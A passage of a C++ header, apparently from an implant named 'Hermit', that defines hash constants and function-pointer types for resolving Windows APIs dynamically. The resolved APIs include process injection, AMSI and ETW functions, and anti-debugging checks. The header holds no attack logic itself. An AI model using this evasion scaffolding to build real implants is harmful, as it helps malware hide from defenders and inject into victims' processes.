#ifndef HERMIT_CORE_PROCS_HPP
#define HERMIT_CORE_PROCS_HPP

#include "core/macros.hpp"
#include "core/nt.hpp"
#include "core/stdout.hpp"
#include "core/syscalls.hpp"
#include "core/win32.hpp"

#include <windows.h>
#include <winhttp.h>
#include <ntstatus.h>
#include <string>
#include <tlhelp32.h>
#include <cstring>

#define HASH_IV                                 0x35
#define RANDOM_ADDR                             0xab10f29f

// Generated by script/calc_hash_func.py
#define HASH_FUNC_ETWEVENTWRITE                 0xaa1b5078
#define HASH_FUNC_LDRLOADDLL                    0x19cb5e59
#define HASH_FUNC_NTALLOCATEVIRTUALMEMORY       0xf8829394
#define HASH_FUNC_NTCLOSE                       0x6f18e5dd
#define HASH_FUNC_NTCREATEFILE                  0x2f4d94d3
#define HASH_FUNC_NTCREATENAMEDPIPEFILE         0x333974ac
#define HASH_FUNC_NTCREATEPROCESSEX             0xbd003d8b
#define HASH_FUNC_NTCREATESECTION               0xf7c5c8ae
#define HASH_FUNC_NTCREATETHREADEX              0x2afc9934
#define HASH_FUNC_NTDUPLICATEOBJECT             0xae23334f
#define HASH_FUNC_NTFLUSHINSTRUCTIONCACHE       0x3a43951d
#define HASH_FUNC_NTFREEVIRTUALMEMORY           0xb6eb4645
#define HASH_FUNC_NTGETCONTEXTTHREAD            0x904d345e
#define HASH_FUNC_NTMAPVIEWOFSECTION            0x74433068
#define HASH_FUNC_NTOPENPROCESS                 0x64e24f6a
#define HASH_FUNC_NTOPENPROCESSTOKEN            0xcdd9f7af
#define HASH_FUNC_NTOPENTHREAD                  0xa58f60af
#define HASH_FUNC_NTPROTECTVIRTUALMEMORY        0xa7df2bd8
#define HASH_FUNC_NTQUERYINFORMATIONFILE        0x6226c85b
#define HASH_FUNC_NTQUERYINFORMATIONPROCESS     0xa79c59b0
#define HASH_FUNC_NTQUERYVIRTUALMEMORY          0xa6a7c4bf
#define HASH_FUNC_NTREADFILE                    0xc363b2ad
#define HASH_FUNC_NTREADVIRTUALMEMORY           0x88bc3b5b
#define HASH_FUNC_NTRESUMETHREAD                0x8bad8d92
#define HASH_FUNC_NTSETCONTEXTTHREAD            0x25df9cd2
#define HASH_FUNC_NTSETINFORMATIONFILE          0x52a8041
#define HASH_FUNC_NTSETINFORMATIONPROCESS       0xb5d02d0a
#define HASH_FUNC_NTTERMINATEPROCESS            0xc58a7b49
#define HASH_FUNC_NTUNMAPVIEWOFSECTION          0x574e9fc1
#define HASH_FUNC_NTWRITEVIRTUALMEMORY          0x7c61e008
#define HASH_FUNC_NTWAITFORSINGLEOBJECT         0x73c87a00
#define HASH_FUNC_NTWRITEFILE                   0x9339e2e0

#define HASH_FUNC_RTLALLOCATEHEAP               0xcc7755e
#define HASH_FUNC_RTLCREATEPROCESSREFLECTION    0x6fa72a9
#define HASH_FUNC_RTLCREATEUSERTHREAD           0x43322de6
#define HASH_FUNC_RTLEXPANDENVIRONMENTSTRINGS   0xb73f443e
#define HASH_FUNC_RTLGETFULLPATHNAME_U          0x2116c216
#define HASH_FUNC_RTLINITUNICODESTRING          0x4dc9caa9
#define HASH_FUNC_RTLQUERYSYSTEMINFORMATION     0xf6044a6a
#define HASH_FUNC_RTLSTRINGCCHCATW              0x2deef223
#define HASH_FUNC_RTLSTRINGCCHCOPYW             0x32231e60
#define HASH_FUNC_RTLSTRINGCCHLENGTHW           0x28821d8f
#define HASH_FUNC_RTLZEROMEMORY                 0x899c0d1e

#define HASH_FUNC_ADJUSTTOKENPRIVILEGES         0x667f28f7
#define HASH_FUNC_AMSISCANBUFFER                0xb2f48854
#define HASH_FUNC_BCRYPTCLOSEALGORITHMPROVIDER  0x34507089
#define HASH_FUNC_BCRYPTDECRYPT                 0x8f0ca18c
#define HASH_FUNC_BCRYPTDESTROYKEY              0xb3e3d126
#define HASH_FUNC_BCRYPTENCRYPT                 0x603fcbe4
#define HASH_FUNC_BCRYPTGENERATESYMMETRICKEY    0x37f3fd1e
#define HASH_FUNC_BCRYPTGETPROPERTY             0x227e23ca
#define HASH_FUNC_BCRYPTOPENALGORITHMPROVIDER   0xecd54615
#define HASH_FUNC_BCRYPTSETPROPERTY             0xadd558d6
#define HASH_FUNC_CHECKREMOTEDEBUGGERPRESENT    0x478dd921
#define HASH_FUNC_CLOSEHANDLE                   0x47bdd9cb
#define HASH_FUNC_CONVERTTHREADTOFIBER          0x2e8dfca9
#define HASH_FUNC_CREATEEVENTW                  0xfce8abee
#define HASH_FUNC_CREATEFIBER                   0x37a0ab5b
#define HASH_FUNC_CREATEPIPE                    0xfee438df
#define HASH_FUNC_CREATEPROCESSW                0x78f4d6f9
#define HASH_FUNC_CREATEREMOTETHREADEX          0xdc857934
#define HASH_FUNC_CREATETHREADPOOLWAIT          0x7a8370ac
#define HASH_FUNC_CREATETOOLHELP32SNAPSHOT      0x3e99f14d
#define HASH_FUNC_CRYPTBINARYTOSTRINGW          0x3bb09cf1
#define HASH_FUNC_CRYPTSTRINGTOBINARYW          0x6ff96cf1
#define HASH_FUNC_ENUMPROCESSMODULES            0x5a9d078e
#define HASH_FUNC_EXPANDENVIRONMENTSTRINGSW     0x30ae5619
#define HASH_FUNC_FINDWINDOWW                   0x530252f9
#define HASH_FUNC_FREELIBRARY                   0x26174ba
#define HASH_FUNC_GETMODULEBASENAMEA            0x74fb798
#define HASH_FUNC_GETMODULEHANDLEA              0xbf3b40ac
#define HASH_FUNC_GETPROCADDRESS                0xafa3e09d
#define HASH_FUNC_GETSYSTEMDIRECTORYW           0x7115fb1a
#define HASH_FUNC_GETSYSTEMINFO                 0x109fc03e
#define HASH_FUNC_GETTHREADCONTEXT              0x749d3064
#define HASH_FUNC_GETWINDOWTHREADPROCESSID      0x7fcdda0f
#define HASH_FUNC_IMAGENTHEADER                 0xc7a89db9
#define HASH_FUNC_ISDEBUGGERPRESENT             0xef4ed1b
#define HASH_FUNC_LOADLIBRARYA                  0x7069f241
#define HASH_FUNC_LOADLIBRARYW                  0x7069f257
#define HASH_FUNC_LOOKUPPRIVILEGEVALUEW         0x6e9aab88
#define HASH_FUNC_MESSAGEBOXA                   0xcc4a1d08
#define HASH_FUNC_MESSAGEBOXW                   0xcc4a1d1e
#define HASH_FUNC_OPENPROCESS                   0xc9e08d0
#define HASH_FUNC_OPENPROCESSTOKEN              0x7d474909
#define HASH_FUNC_OPENTHREAD                    0x45fb8389
#define HASH_FUNC_PROCESS32FIRSTW               0x62d3a260
#define HASH_FUNC_PROCESS32NEXTW                0xb40eb9eb
#define HASH_FUNC_QUEUEUSERAPC                  0x21603fcd
#define HASH_FUNC_READFILE                      0x9a3e0607
#define HASH_FUNC_READPROCESSMEMORY             0xb29e4a5
#define HASH_FUNC_RESUMETHREAD                  0xe6e81fec
#define HASH_FUNC_SETHANDLEINFORMATION          0x59694f77
#define HASH_FUNC_SETTHREADCONTEXT              0xa2f98d8
#define HASH_FUNC_SETTHREADPOOLWAIT             0x5f2a3808
#define HASH_FUNC_SUSPENDTHREAD                 0x50e789b1
#define HASH_FUNC_SWITCHTOFIBER                 0x4115aaa8
#define HASH_FUNC_TERMINATEPROCESS              0x74f7cca3
#define HASH_FUNC_THREAD32FIRST                 0xbf152012
#define HASH_FUNC_THREAD32NEXT                  0xe6531d51
#define HASH_FUNC_VIRTUALALLOC                  0x5ae0dabf
#define HASH_FUNC_VIRTUALALLOCEX                0x104fd152
#define HASH_FUNC_VIRTUALFREE                   0x640675a2
#define HASH_FUNC_VIRTUALPROTECT                0x927857d9
#define HASH_FUNC_VIRTUALPROTECTEX              0x7ac4edec
#define HASH_FUNC_VIRTUALQUERYEX                0xe3c91d25
#define HASH_FUNC_WINHTTPCLOSEHANDLE            0x22081731
#define HASH_FUNC_WINHTTPCONNECT                0xe18b30db
#define HASH_FUNC_WINHTTPOPEN                   0x97451379
#define HASH_FUNC_WINHTTPOPENREQUEST            0xd6cffcd6
#define HASH_FUNC_WINHTTPQUERYDATAAVAILABLE     0xff301fc6
#define HASH_FUNC_WINHTTPQUERYHEADERS           0xe17c65cd
#define HASH_FUNC_WINHTTPREADDATA               0x70389c8f
#define HASH_FUNC_WINHTTPRECEIVERESPONSE        0x66131eb5
#define HASH_FUNC_WINHTTPSENDREQUEST            0x79792358
#define HASH_FUNC_WINHTTPSETOPTION              0x48ed79a8
#define HASH_FUNC_WINHTTPWRITEDATA              0xeed55fda
#define HASH_FUNC_WRITEPROCESSMEMORY            0x9ea48f46
#define HASH_FUNC_WSACLEANUP                    0xd1b44ef4
#define HASH_FUNC_WSASTARTUP                    0xa548e84d

namespace Procs
{
    // **NTAPI**

    // EdwEventWrite
    typedef NTSTATUS (NTAPI* LPPROC_ETWEVENTWRITE)(Nt::REGHANDLE RegHandle, Nt::PCEVENT_DESCRIPTOR EventDescriptor, ULONG UserDataCount, Nt::PEVENT_DATA_DESCRIPTOR UserData);
    // LdrLoadDll
    typedef NTSTATUS (NTAPI* LPPROC_LDRLOADDLL)(PWSTR DllPath, PULONG DllCharacteristics, Nt::PUNICODE_STRING DllName, PVOID *DllHandle);
    // NtAllocateVirtualMemory
    typedef NTSTATUS (NTAPI* LPPROC_NTALLOCATEVIRTUALMEMORY)(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
    // NtClose
	typedef NTSTATUS (NTAPI* LPPROC_NTCLOSE)(HANDLE Handle);
    // NtCreateFile
    typedef NTSTATUS (NTAPI* LPPROC_NTCREATEFILE)(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, Nt::POBJECT_ATTRIBUTES ObjectAttributes, Nt::PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength);
    // NtCreateNamedPipeFile
    typedef NTSTATUS (NTAPI* LPPROC_NTCREATENAMEDPIPEFILE)(PHANDLE FileHandle, ULONG DesiredAccess, Nt::POBJECT_ATTRIBUTES ObjectAttributes, Nt::PIO_STATUS_BLOCK IoStatusBlock, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, ULONG NamedPipeType, ULONG ReadMode, ULONG CompletionMode, ULONG MaximumInstances, ULONG InboundQuota, ULONG OutboundQuota, PLARGE_INTEGER DefaultTimeout);
    // NtCreateProcessEx
    typedef NTSTATUS (NTAPI* LPPROC_NTCREATEPROCESSEX)(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, Nt::POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ParentProcess, ULONG Flags, HANDLE SectionHandle, HANDLE DebugPort, HANDLE TokenHandle, ULONG Reserved);
    // NtCreateSection
    typedef NTSTATUS (NTAPI* LPPROC_NTCREATESECTION)(PHANDLE SectionHandle, ACCESS_MASK DesiredAccess, Nt::POBJECT_ATTRIBUTES ObjectAttributes, PLARGE_INTEGER MaximumSize, ULONG SectionPageProtection, ULONG AllocationAttributes, HANDLE FileHandle);
    // NtCreateThreadEx
    typedef NTSTATUS (NTAPI* LPPROC_NTCREATETHREADEX)(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, Nt::POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ProcessHandle, LPTHREAD_START_ROUTINE StartRoutine, PVOID Argument, ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, Nt::PPS_ATTRIBUTE_LIST AttributeList);
    // NtDuplicateObject
    typedef NTSTATUS (NTAPI* LPPROC_NTDUPLICATEOBJECT)(HANDLE SourceProcessHandle, PHANDLE SourceHandle, HANDLE TargetProcessHandle, PHANDLE TargetHandle, ACCESS_MASK DesiredAccess, BOOLEAN InheritHandle, ULONG Options);
    // NtFlushInstructionCache
    typedef NTSTATUS (NTAPI* LPPROC_NTFLUSHINSTRUCTIONCACHE)(HANDLE ProcessHandle, PVOID BaseAddress, SIZE_T Length);
    // NtFreeVirtualMemory
    typedef NTSTATUS (NTAPI* LPPROC_NTFREEVIRTUALMEMORY)(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG FreeType);
    // NtGetContextThread
    typedef NTSTATUS (NTAPI* LPPROC_NTGETCONTEXTTHREAD)(HANDLE ThreadHandle, PCONTEXT ThreadContext);
    // NtMapViewOfSection
    typedef NTSTATUS (NTAPI* LPPROC_NTMAPVIEWOFSECTION)(HANDLE SectionHandle, HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, Nt::SECTION_INHERIT InheritDisposition, ULONG AllocationType, ULONG Win32Protect);
    // NtOpenProcess
    typedef NTSTATUS (NTAPI* LPPROC_NTOPENPROCESS)(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, Nt::POBJECT_ATTRIBUTES ObjectAttributes, Nt::PCLIENT_ID ClientId);
    // NtOpenProcessToken
    typedef NTSTATUS (NTAPI* LPPROC_NTOPENPROCESSTOKEN)( HANDLE ProcessHandle, ACCESS_MASK DesiredAccess, PHANDLE TokenHandle);
    // NtOpenThread
    typedef NTSTATUS (NTAPI* LPPROC_NTOPENTHREAD)(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, Nt::POBJECT_ATTRIBUTES ObjectAttributes, Nt::PCLIENT_ID ClientId);
    // NtProtectVirtualMemory
    typedef NTSTATUS (NTAPI* LPPROC_NTPROTECTVIRTUALMEMORY)(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect);
    // NtReadFile
    typedef NTSTATUS (NTAPI* LPPROC_NTREADFILE)(HANDLE FileHandle, HANDLE Event, Nt::PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, Nt::PIO_STATUS_BLOCK IoStatusBlock, PVOID Buffer, ULONG Length, PLARGE_INTEGER ByteOffset, PULONG Key);
    // NtReadVirtualMemory
    typedef NTSTATUS (NTAPI* LPPROC_NTREADVIRTUALMEMORY)(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T BufferSize, PSIZE_T NumberOfBytesRead);
    // NtQueryInformationFile
    typedef NTSTATUS (NTAPI* LPPROC_NTQUERYINFORMATIONFILE)(HANDLE FileHandle, Nt::PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, Nt::FILE_INFORMATION_CLASS FileInformationClass);
    // NtQueryInformationProcess
    typedef NTSTATUS (NTAPI* LPPROC_NTQUERYINFORMATIONPROCESS)(HANDLE ProcessHandle, Nt::PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength);
    // NtQueryVirtualMemory
    typedef NTSTATUS (NTAPI* LPPROC_NTQUERYVIRTUALMEMORY)(HANDLE ProcessHandle, PVOID BaseAddress, Nt::MEMORY_INFORMATION_CLASS MemoryInformationClass, PVOID MemoryInformation, SIZE_T MemoryInformationLength, PSIZE_T ReturnLength);
    // NtResumeThread
    typedef NTSTATUS (NTAPI* LPPROC_NTRESUMETHREAD)(HANDLE ThreadHandle, PULONG PreviousSuspendCount);
    // NtSetContextThread
    typedef NTSTATUS (NTAPI* LPPROC_NTSETCONTEXTTHREAD)(HANDLE ThreadHandle, PCONTEXT ThreadContext);
    // NtSetInformationFile
    typedef NTSTATUS (NTAPI* LPPROC_NTSETINFORMATIONFILE)(HANDLE FileHandle, Nt::PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, Nt::FILE_INFORMATION_CLASS FileInformationClass);
    // NtSetInformationProcess
    typedef NTSTATUS (NTAPI* LPPROC_NTSETINFORMATIONPROCESS)(HANDLE ProcessHandle, Nt::PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength);
    // NtTerminateProcess
	typedef NTSTATUS (NTAPI* LPPROC_NTTERMINATEPROCESS)(HANDLE ProcessHandle, NTSTATUS ExitStatus);
    // NtUnmapViewOfSection
    typedef NTSTATUS (NTAPI* LPPROC_NTUNMAPVIEWOFSECTION)(HANDLE ProcessHandle, PVOID BaseAddress);
    // NtWriteVirtualMemory
    typedef NTSTATUS (NTAPI* LPPROC_NTWRITEVIRTUALMEMORY)(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten);
    // NtWaitForSingleObject
    typedef NTSTATUS (NTAPI* LPPROC_NTWAITFORSINGLEOBJECT)(HANDLE Handle, BOOLEAN Alertable, PLARGE_INTEGER Timeout);
    // NtWriteFile
    typedef NTSTATUS (NTAPI* LPPROC_NTWRITEFILE)(HANDLE FileHandle, HANDLE Event, Nt::PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, Nt::PIO_STATUS_BLOCK IoStatusBlock, PVOID Buffer, ULONG Length, PLARGE_INTEGER ByteOffset, PULONG Key);
    
    // RtlAllocateHeap
    typedef PVOID (NTAPI* LPPROC_RTLALLOCATEHEAP)(PVOID HeapHandle, ULONG Flags, SIZE_T Size);
    // RtlCreateProcessReflection
    typedef NTSTATUS (NTAPI* LPPROC_RTLCREATEPROCESSREFLECTION)(HANDLE ProcessHandle, ULONG Flags, PVOID StartRoutine, PVOID StartContext, HANDLE EventHandle, Nt::PRTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION ReflectionInformation);
    // RtlCreateUserThread
    typedef NTSTATUS (NTAPI* LPPROC_RTLCREATEUSERTHREAD)(HANDLE ProcessHandle, PSECURITY_DESCRIPTOR ThreadSecurityDescriptor, BOOLEAN CreateSuspended, ULONG ZeroBits, SIZE_T MaximumStackSize, SIZE_T CommittedStackSize, Nt::PUSER_THREAD_START_ROUTINE StartAddress, PVOID Parameter, PHANDLE ThreadHandle, Nt::PCLIENT_ID ClientId);
    // RtlExpandEnvironmentStrings
    typedef NTSTATUS (NTAPI* LPPROC_RTLEXPANDENVIRONMENTSTRINGS)(PVOID Environment, PCWSTR Source, SIZE_T SourceLength, PWSTR Destination, SIZE_T DestinationLength, PSIZE_T ReturnLength);
    // RtlGetFullPathName_U
    typedef NTSTATUS (NTAPI* LPPROC_RTLGETFULLPATHNAME_U)(PCWSTR FileName, ULONG BufferLength, PWSTR Buffer, PWSTR *FilePart);
    // RtlInitUnicodeString
    typedef NTSTATUS (NTAPI* LPPROC_RTLINITUNICODESTRING)(Nt::PUNICODE_STRING DestinationString, PCWSTR SourceString);
    // RtlNtStatusToDosError
    typedef DWORD (NTAPI* LPPROC_RTLNTSTATUSTODOSERROR)(NTSTATUS Status);
    // RtlQuerySystemInformation
    typedef NTSTATUS (NTAPI* LPPROC_RTLQUERYSYSTEMINFORMATION)(Nt::SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
    // RtlStringCchCatW
    typedef NTSTATUS (NTAPI* LPPROC_RTLSTRINGCCHCATW)(LPWSTR pszDest, SIZE_T cchDest, LPCWSTR pszSrc);
    // RtlStringCchCopyW
    typedef NTSTATUS (NTAPI* LPPROC_RTLSTRINGCCHCOPYW)(LPWSTR pszDest, SIZE_T cchDest, LPCWSTR pszSrc);
    // RtlStringCchLengthW
    typedef NTSTATUS (NTAPI* LPPROC_RTLSTRINGCCHLENGTHW)(PCWSTR psz, SIZE_T cchMax, SIZE_T *pcchLength);
    // RtlZeroMemory
    typedef VOID (NTAPI* LPPROC_RTLZEROMEMORY)(PVOID Destination, SIZE_T Length);

    // **WINAPI**
    
    // AdjustTokenPrivileges
    typedef BOOL (WINAPI* LPPROC_ADJUSTTOKENPRIVILEGES)(HANDLE TokenHandle, BOOL DisableAllPrivileges, PTOKEN_PRIVILEGES NewState, DWORD BufferLength, PTOKEN_PRIVILEGES PreviousState, PDWORD ReturnLength);
    // AmsiScanBuffer
    typedef HRESULT (WINAPI* LPPROC_AMSISCANBUFFER)(Win32::HAMSICONTEXT amsiContext, PVOID buffer, ULONG length, LPCWSTR contentName, Win32::HAMSISESSION amsiSession, Win32::AMSI_RESULT *result);
    // BCryptCloseAlgorithmProvider
    typedef NTSTATUS (WINAPI* LPPROC_BCRYPTCLOSEALGORITHMPROVIDER)(BCRYPT_ALG_HANDLE hAlgorithm, ULONG dwFlags);
    // BCryptDecrypt
    typedef NTSTATUS (WINAPI* LPPROC_BCRYPTDECRYPT)(BCRYPT_KEY_HANDLE hKey, PUCHAR pbInput, ULONG cbInput, VOID *pPaddingInfo, PUCHAR pbIV, ULONG cbIV, PUCHAR pbOutput, ULONG cbOutput, ULONG *pcbResult, ULONG dwFlags);
    // BCryptDestroyKey
    typedef NTSTATUS (WINAPI* LPPROC_BCRYPTDESTROYKEY)(BCRYPT_KEY_HANDLE hKey);
    // BCryptEncrypt
    typedef NTSTATUS (WINAPI* LPPROC_BCRYPTENCRYPT)(BCRYPT_KEY_HANDLE hKey, PUCHAR pbInput, ULONG cbInput, VOID *pPaddingInfo, PUCHAR pbIV, ULONG cbIV, PUCHAR pbOutput, ULONG cbOutput, ULONG *pcbResult, ULONG dwFlags);
    // BCryptGenerateSymmetricKey
    typedef NTSTATUS (WINAPI* LPPROC_BCRYPTGENERATESYMMETRICKEY)(BCRYPT_ALG_HANDLE hAlgorithm, BCRYPT_KEY_HANDLE *phKey, PUCHAR pbKeyObject, ULONG cbKeyObject, PUCHAR pbSecret, ULONG cbSecret, ULONG dwFlags);
    // BCryptGetProperty
    typedef NTSTATUS (WINAPI* LPPROC_BCRYPTGETPROPERTY)(BCRYPT_HANDLE hObject, LPCWSTR pszProperty, PUCHAR pbOutput, ULONG cbOutput, ULONG *pcbResult, ULONG dwFlags);
    // BCryptOpenAlgorithmProvider
    typedef NTSTATUS (WINAPI* LPPROC_BCRYPTOPENALGORITHMPROVIDER)(BCRYPT_ALG_HANDLE *phAlgorithm, LPCWSTR pszAlgId, LPCWSTR pszImplementation, ULONG dwFlags);
    // BCryptSetProperty
    typedef NTSTATUS (WINAPI* LPPROC_BCRYPTSETPROPERTY)(BCRYPT_HANDLE hObject, LPCWSTR pszProperty, PUCHAR pbInput, ULONG cbInput, ULONG dwFlags);
    // CheckRemoteDebuggerPresent
    typedef BOOL (WINAPI* LPPROC_CHECKREMOTEDEBUGGERPRESENT)(HANDLE hProcess, PBOOL pbDebuggerPresent);
    // CloseHandle
    typedef BOOL (WINAPI* LPPROC_CLOSEHANDLE)(HANDLE hObject);
    // ConvertThreadToFiber
    typedef LPVOID (WINAPI* LPPROC_CONVERTTHREADTOFIBER)(LPVOID lpParameter);
    // CreateEventW
    typedef HANDLE (WINAPI* LPPROC_CREATEEVENTW)(LPSECURITY_ATTRIBUTES lpEventAttributes, BOOL bManualReset, BOOL bInitialState, LPCWSTR lpName);
    // CreateFiber
    typedef LPVOID (WINAPI* LPPROC_CREATEFIBER)(SIZE_T dwStackSize, LPFIBER_START_ROUTINE lpStartAddress, LPVOID lpParameter);
    // CreatePipe
    typedef BOOL (WINAPI* LPPROC_CREATEPIPE)(PHANDLE hReadPipe, PHANDLE hWritePipe, LPSECURITY_ATTRIBUTES lpPipeAttributes, DWORD nSize);
    // CreateProcessW
    typedef BOOL (WINAPI* LPPROC_CREATEPROCESSW)(LPCWSTR lpApplicationName, LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
    // CreateRemoteThreadEx
    typedef HANDLE (WINAPI* LPPROC_CREATEREMOTETHREADEX)(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList, LPDWORD lpThreadId);
    // CreateThreadpoolWait
    typedef PTP_WAIT (WINAPI* LPPROC_CREATETHREADPOOLWAIT)(PTP_WAIT_CALLBACK pfnwa, PVOID pv, PTP_CALLBACK_ENVIRON pcbe);
    // CreateToolhelp32Snapshot
    typedef HANDLE (WINAPI* LPPROC_CREATETOOLHELP32SNAPSHOT)(DWORD dwFlags, DWORD th32ProcessID);
    // CryptBinaryToStringW
    typedef BOOL (WINAPI* LPPROC_CRYPTBINARYTOSTRINGW)(const BYTE *pbBinary, DWORD cbBinary, DWORD dwFlags, LPWSTR pszString, DWORD *pcchString);
    // CryptStringToBinaryW
    typedef BOOL (WINAPI* LPPROC_CRYPTSTRINGTOBINARYW)(LPCWSTR pszString, DWORD cchString, DWORD dwFlags, BYTE *pbBinary, DWORD *pcbBinary, DWORD *pdwSkip, DWORD *pdwFlags);
     // DllMain
    typedef BOOL (WINAPI* LPPROC_DLLMAIN)(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved);
    // EnumProcessModules
    typedef BOOL (WINAPI* LPPROC_ENUMPROCESSMODULES)(HANDLE hProcess, HMODULE *lphModule, DWORD cb, LPDWORD lpcbNeeded);
    // ExpandEnvironmentStringsW
    typedef DWORD (WINAPI* LPPROC_EXPANDENVIRONMENTSTRINGSW)(LPCWSTR lpSrc, LPWSTR lpDst, DWORD nSize);
    // FindWindowW
    typedef HWND (WINAPI* LPPROC_FINDWINDOWW)(LPCWSTR lpClassName, LPCWSTR lpWindowName);
    // FreeLibrary
    typedef BOOL (WINAPI* LPPROC_FREELIBRARY)(HMODULE hLibModule);
    // GetModuleBaseNameA
    typedef DWORD (WINAPI* LPPROC_GETMODULEBASENAMEA)(HANDLE hProcess, HMODULE hModule, LPSTR lpBaseName, DWORD nSize);
    // GetModuleHandleA
    typedef HMODULE (WINAPI* LPPROC_GETMODULEHANDLEA)(LPCSTR lpModuleName);
    // GetProcAddress
    typedef FARPROC (WINAPI* LPPROC_GETPROCADDRESS)(HMODULE hModule, LPCSTR lpProcName);
    // GetSystemDirectoryW
    typedef UINT (WINAPI* LPPROC_GETSYSTEMDIRECTORYW)(LPWSTR lpBuffer, UINT uSize);
    // GetSystemInfo
    typedef VOID (WINAPI* LPPROC_GETSYSTEMINFO)(LPSYSTEM_INFO lpSystemInfo);
    // GetThreadContext
    typedef BOOL (WINAPI* LPPROC_GETTHREADCONTEXT)(HANDLE hThread, LPCONTEXT lpContext);
    // GetWindowThreadProcessId
    typedef DWORD (WINAPI* LPPROC_GETWINDOWTHREADPROCESSID)(HWND hWnd, LPDWORD lpdwProcessId);
    // ImageNtHeader
    typedef PIMAGE_NT_HEADERS (WINAPI* LPPROC_IMAGENTHEADER)(PVOID Base);
    // IsDebuggerPresent
    typedef BOOL (WINAPI* LPPROC_ISDEBUGGERPRESENT)();
    // LoadLibraryA
    typedef HMODULE (WINAPI* LPPROC_LOADLIBRARYA)(LPCSTR lpLibFileName);
    // LoadLibraryW
    typedef HMODULE (WINAPI* LPPROC_LOADLIBRARYW) (LPCWSTR lpLibFileName);
    // LookupPrivilegeValueW
    typedef BOOL (WINAPI* LPPROC_LOOKUPPRIVILEGEVALUEW)(LPCWSTR lpSystemName, LPCWSTR lpName, PLUID lpLuid);
    // MessageBoxA
    typedef int (WINAPI* LPPROC_MESSAGEBOXA)(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType);
    // MessageBoxW
    typedef int (WINAPI* LPPROC_MESSAGEBOXW)(HWND hWnd, LPCWSTR lpText, LPCWSTR lpCaption, UINT uType, WORD wLanguageId);
    // OpenProcess
    typedef HANDLE (WINAPI* LPPROC_OPENPROCESS)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
    // OpenProcessToken
    typedef HANDLE (WINAPI* LPPROC_OPENPROCESSTOKEN)(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
    // OpenThread
    typedef HANDLE (WINAPI* LPPROC_OPENTHREAD)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwThreadId);
    // Process32FirstW
    typedef BOOL (WINAPI* LPPROC_PROCESS32FIRSTW)(HANDLE hSnapshot, LPPROCESSENTRY32W lppe);
    // Process32NextW
    typedef BOOL (WINAPI* LPPROC_PROCESS32NEXTW)(HANDLE hSnapshot, LPPROCESSENTRY32W lppe);
    // QueueUserAPC
    typedef DWORD (WINAPI* LPPROC_QUEUEUSERAPC)(PAPCFUNC pfnAPC,  HANDLE hThread, ULONG_PTR dwData);
    // ReadFile
    typedef BOOL (WINAPI* LPPROC_READFILE)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
    // ReadProcessMemory
    typedef BOOL (WINAPI* LPPROC_READPROCESSMEMORY)(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesRead);
    // ResumeThread
    typedef DWORD (WINAPI* LPPROC_RESUMETHREAD)(HANDLE hThread);
    // SetHandleInformation
    typedef BOOL (WINAPI* LPPROC_SETHANDLEINFORMATION)(HANDLE hObject, DWORD dwMask, DWORD dwFlags);
    // SetThreadContext
    typedef BOOL (WINAPI* LPPROC_SETTHREADCONTEXT)(HANDLE hThread, const CONTEXT *lpContext);
    // SetThreadpoolWait
    typedef VOID (WINAPI* LPPROC_SETTHREADPOOLWAIT)(PTP_WAIT pwa, HANDLE h, PFILETIME pftTimeout);
    // SuspendThread
    typedef DWORD (WINAPI* LPPROC_SUSPENDTHREAD)(HANDLE hThread);
    // SwitchToFiber
    typedef VOID (WINAPI* LPPROC_SWITCHTOFIBER)(LPVOID lpFiber);
    // TerminateProcess
